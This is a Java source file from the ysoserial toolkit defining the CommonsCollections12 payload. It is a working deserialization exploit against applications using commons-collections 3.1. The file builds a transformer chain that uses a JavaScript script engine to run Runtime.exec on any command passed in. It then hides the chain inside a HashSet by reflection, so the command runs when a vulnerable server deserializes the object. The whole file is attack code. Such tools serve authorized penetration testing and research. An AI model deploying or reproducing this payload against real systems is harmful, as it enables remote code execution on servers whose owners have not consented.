package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import javax.script.ScriptEngineManager;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({"Y4er"})
public class CommonsCollections12 extends PayloadRunner implements ObjectPayload<Object> {
    public CommonsCollections12() {
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections12.class, args);
    }

    public Object getObject(String command) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + command + "');"})};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var17) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var16) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var15) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        return map;
    }
}
